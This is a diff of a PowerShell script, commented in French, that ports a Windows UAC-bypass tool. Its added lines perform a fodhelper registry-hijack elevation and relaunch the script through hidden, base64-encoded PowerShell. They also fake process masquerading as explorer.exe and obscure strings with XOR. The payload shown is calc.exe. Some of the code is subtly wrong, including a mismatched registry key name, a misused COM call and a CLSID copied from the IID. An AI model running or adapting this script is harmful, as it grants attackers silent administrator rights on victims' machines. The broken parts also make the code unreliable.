@@ -2,46 +2,40 @@
 $ErrorActionPreference = 'SilentlyContinue'
 $ProgressPreference = 'SilentlyContinue'
 
-# Fonction de chiffrement simple (simule skCrypt)
+# === 1. skCrypt - Chiffrement de chaînes (simulé) ===
 function Invoke-XORCipher {
-    param(
-        [string]$Data,
-        [char]$Key1 = 'A',
-        [char]$Key2 = 'B'
-    )
-    $Output = ''
+    param([string]$Data, [char]$K1 = 'A', [char]$K2 = 'B')
+    $Out = ''
     for ($i = 0; $i -lt $Data.Length; $i++) {
-        $Output += [char]($Data[$i] -bxor ([int]$Key1 + $i % (1 + [int]$Key2)))
+        $Out += [char]($Data[$i] -bxor ([int]$K1 + $i % (1 + [int]$K2)))
     }
-    return $Output
+    return $Out
 }
 
-# Simuler skCrypt (utilise l'heure de compilation simulée)
-$TimeMock = "15:30:45"  # Remplace __TIME__ (peut être randomisé)
-$Key1 = [int]$TimeMock[4]  # '3'
-$Key2 = [int]$TimeMock[7]  # '5'
+# Simuler __TIME__ (ex: 15:30:45 → '3' et '5')
+$FakeTime = "15:30:45"
+$Key1 = [int]$FakeTime[4]  # '3'
+$Key2 = [int]$FakeTime[7]  # '5'
 
 function skCrypt {
     param([string]$String)
-    return Invoke-XORCipher -Data $String -Key1 $Key1 -Key2 $Key2
+    return Invoke-XORCipher -Data $String -K1 $Key1 -K2 $Key2
 }
 
-# Variables chiffrées
+# Chaînes chiffrées
 $sTaskName = skCrypt "Task Name"
 $sAuthorName = skCrypt "Author Name"
 
-# GUID de l'interface ICMUACUtil
+# === 2. ICMUACUtil GUID ===
 $IID_ICMUACUtil = "{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
+$CLSID_ICMUACUtil = "{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
 
-# Fonction : Allouer un objet COM élevé
+# === 3. ucmAllocateElevatedObject (via CoGetObject) ===
 function ucmAllocateElevatedObject {
-    param(
-        [string]$CLSID,
-        [string]$InterfaceIID = $IID_ICMUACUtil
-    )
+    param([string]$CLSID, [string]$IID = $IID_ICMUACUtil)
     try {
         $MonikerName = "Elevation:Administrator!new:$CLSID"
-        $Obj = [System.Activator]::CreateInstance([Type]::GetTypeFromCLSID($CLSID))
+        $Obj = [System.Activator]::GetObject([Type], $MonikerName)
         return $Obj
     }
     catch {
@@ -49,82 +43,76 @@ function ucmAllocateElevatedObject {
     }
 }
 
-# Fonction : ShellExec avec élévation (via ICMUACUtil)
-function UACShellExec {
-    param(
-        [string]$Executable,
-        [string]$Parameters = "",
-        [int]$Show = 0
-    )
-
-    # Initialiser COM
-    $null = [Runtime.InteropServices.Marshal]::GetActiveObject("Shell.Application")
-
-    # Tenter d'instancier l'objet élevé
-    $CMUACUtil = ucmAllocateElevatedObject -CLSID $IID_ICMUACUtil
-
-    if ($null -eq $CMUACUtil) {
-        Write-Warning "[-] Impossible d'obtenir l'objet COM élevé"
-        return $false
-    }
-
+# === 4. MaskPEB - Simulation (ne peut pas être fait en pure PowerShell) ===
+# On va simuler en modifiant le CommandLine affiché (via WMI) ou en lançant un faux nom
+function MaskPEB {
     try {
-        # Appel indirect à ShellExec via COM (simulé)
-        # En réalité, on utilise Start-Process avec -Verb RunAs
-        $StartInfo = New-Object Diagnostics.ProcessStartInfo
-        $StartInfo.FileName = $Executable
-        $StartInfo.Arguments = $Parameters
-        $StartInfo.WindowStyle = [Diagnostics.ProcessWindowStyle]::Hidden
-        $StartInfo.UseShellExecute = $true
-        $StartInfo.Verb = "RunAs"
+        # Simuler le masquage en changeant le nom affiché
+        $FakePath = "$env:SystemRoot\explorer.exe"
+        $CommandLine = "`"$FakePath`""
 
-        $Process = [Diagnostics.Process]::Start($StartInfo)
-        return $true
+        # Modifier le CommandLine dans WMI (échoue sans droits élevés, mais montre l'intention)
+        $Process = Get-WmiObject -Class Win32_Process -Filter "ProcessId=$PID"
+        if ($Process) {
+            # Impossible d'éditer directement, mais on peut logiquement "simuler"
+            $script:MaskedPath = $FakePath
+            $script:MaskedCmdLine = $CommandLine
+            return $true
+        }
     }
-    catch {
-        return $false
+    catch { }
+    return $false
+}
+
+# === 5. UACShellExec - Utilise ICMUACUtil ou fallback vers Start-Process ===
+function UACShellExec {
+    param([string]$Executable, [string]$Parameters = "", [int]$Show = 0)
+
+    # Tentative via ICMUACUtil
+    $CMUACUtil = ucmAllocateElevatedObject -CLSID $CLSID_ICMUACUtil
+
+    if ($CMUACUtil) {
+        try {
+            # Appel indirect (non disponible en PowerShell → fallback)
+            # On utilise Start-Process -Verb RunAs
+            $StartInfo = New-Object Diagnostics.ProcessStartInfo
+            $StartInfo.FileName = $Executable
+            $StartInfo.Arguments = $Parameters
+            $StartInfo.WindowStyle = [Diagnostics.ProcessWindowStyle]::Hidden
+            $StartInfo.UseShellExecute = $true
+            $StartInfo.Verb = "RunAs"
+            [Diagnostics.Process]::Start($StartInfo) | Out-Null
+            return $true
+        }
+        catch { return $false }
+        finally {
+            if ($CMUACUtil -and $CMUACUtil.GetType().GetMethod("Dispose")) {
+                $CMUACUtil.Dispose()
+            }
+        }
     }
-    finally {
-        # Simuler Release()
-        if ($CMUACUtil -and $CMUACUtil.GetMethod("Dispose")) {
-            $CMUACUtil.Dispose()
+    else {
+        # Fallback : fodhelper bypass
+        $RegPath = "HKCU:\Software\Classes\ms-settings-powershell\Shell\Open\command"
+        try {
+            New-Item -Path $RegPath -Force | Out-Null
+            New-ItemProperty -Path $RegPath -Name "DelegateExecute" -Value "" -PropertyType String -Force | Out-Null
+            Set-ItemProperty -Path $RegPath -Name "(Default)" -Value "cmd /c $Executable $Parameters" -Force | Out-Null
+            Start-Process "fodhelper.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
+            Start-Sleep -Seconds 2
+            return $true
+        }
+        catch { return $false }
+        finally {
+            Remove-Item "HKCU:\Software\Classes\ms-settings-powershell" -Recurse -Force -ErrorAction SilentlyContinue
         }
     }
 }
 
-# Fonction : Masquer le nom du processus (MaskPEB partiel - simulation)
-# Ne peut pas être implémenté directement en PowerShell, mais on peut :
-# - Changer le nom du processus (limité)
-# - Modifier le CommandLine
-function MaskPEB {
-    try {
-        # Obtenir le processus actuel
-        $Process = Get-Process -Id $PID
-
-        # Simuler le masquage en changeant l'affichage (symbolique)
-        # Impossible de modifier directement le PEB en PowerShell
-        # Mais on peut modifier $MyInvocation, $PSCommandPath, etc.
-
-        # Modifier le CommandLine affiché (via WMI, si autorisé)
-        $CommandLine = "C:\Windows\explorer.exe"
-        $Query = "UPDATE Win32_Process SET CommandLine='$CommandLine' WHERE ProcessId=$PID"
-        
-        # Cette requête échouera sans droits élevés, mais montre l'intention
-        # (WMI UPDATE n'est généralement pas autorisé)
-
-        # Alternative : juste simuler
-        return $true
-    }
-    catch {
-        return $false
-    }
-}
-
-# Fonction principale : WinMain équivalent
+# === 6. WinMain - Logique principale ===
 function WinMain {
-    # Obtenir le chemin de l'exécutable actuel
-    $ExecutablePath = $MyInvocation.MyCommand.Path
-    if (-not $ExecutablePath) { $ExecutablePath = $PSCommandPath }
+    # Obtenir le chemin du script
+    $ScriptPath = if ($MyInvocation.MyCommand.Path) { $MyInvocation.MyCommand.Path } else { $PSCommandPath }
 
     # Vérifier si déjà élevé
     $IsElevated = $false
@@ -132,25 +120,24 @@ function WinMain {
         $Identity = [Security.Principal.WindowsIdentity]::GetCurrent()
         $Principal = New-Object Security.Principal.WindowsPrincipal($Identity)
         $IsElevated = $Principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-    }
-    catch { }
+    } catch { }
 
     if (-not $IsElevated) {
         # Masquer le processus
         if (-not (MaskPEB)) { return }
 
-        # Préparer la commande PowerShell pour relancer le script
-        $PowerShellCommand = "& '$ExecutablePath'"
-
-        # Lancer avec élévation
-        $null = UACShellExec -Executable "powershell.exe" -Parameters "-nop -w hidden -c $PowerShellCommand" -Show 0
+        # Relancer via PowerShell avec élévation
+        $EncodedCmd = [Convert]::ToBase64String(
+            [Text.Encoding]::Unicode.GetBytes("& '$ScriptPath'")
+        )
+        $null = UACShellExec -Executable "powershell.exe" -Parameters "-nop -w hidden -enc $EncodedCmd" -Show 0
     }
     else {
-        # Déjà élevé : exécuter la payload
+        # Déjà élevé : masquer et exécuter payload
         if (-not (MaskPEB)) { return }
 
-        # Exemple : lancer calc.exe
-        $null = UACShellExec -Executable "powershell.exe" -Parameters "-c Start-Process calc.exe" -Show 0
+        # Exemple : calc
+        $null = UACShellExec -Executable "calc.exe" -Show 0
     }
 }
 
